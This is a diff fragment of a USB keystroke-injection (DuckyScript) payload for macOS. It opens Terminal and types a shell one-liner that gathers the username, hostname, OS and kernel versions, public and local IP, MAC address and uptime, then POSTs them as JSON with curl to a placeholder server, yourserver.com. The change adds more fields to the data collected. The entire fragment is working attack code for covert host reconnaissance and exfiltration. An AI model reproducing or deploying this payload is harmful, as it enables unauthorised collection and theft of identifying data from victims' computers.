@@ -32,7 +32,7 @@ STRING terminal
 DELAY 500
 ENTER
 DELAY 1000
-STRING username=$(whoami);hostname=$(scutil --get ComputerName);os=$(sw_vers -productName);public_ip=$(curl -s ifconfig.me);data="{\"username\":\"$username\",\"hostname\":\"$hostname\",\"os\":\"$os\",\"public_ip\":\"$public_ip\"}";curl -X POST -H "Content-Type: application/json" -d "$data" http://yourserver.com
+STRING username=$(whoami);hostname=$(scutil --get ComputerName);os=$(sw_vers -productName);os_version=$(sw_vers -productVersion);kernel_version=$(uname -r);public_ip=$(curl -s ifconfig.me);local_ip=$(ipconfig getifaddr en0);mac_address=$(ifconfig en0 | grep ether | awk '{print $2}');uptime=$(uptime | awk '{print $3,$4}' | sed 's/,//');data="{\"username\":\"$username\",\"hostname\":\"$hostname\",\"os\":\"$os\",\"os_version\":\"$os_version\",\"kernel_version\":\"$kernel_version\",\"public_ip\":\"$public_ip\",\"local_ip\":\"$local_ip\",\"mac_address\":\"$mac_address\",\"uptime\":\"$uptime\"}";curl -X POST -H "Content-Type: application/json" -d "$data" http://yourserver.com
 DELAY 500
 ENTER
 ```
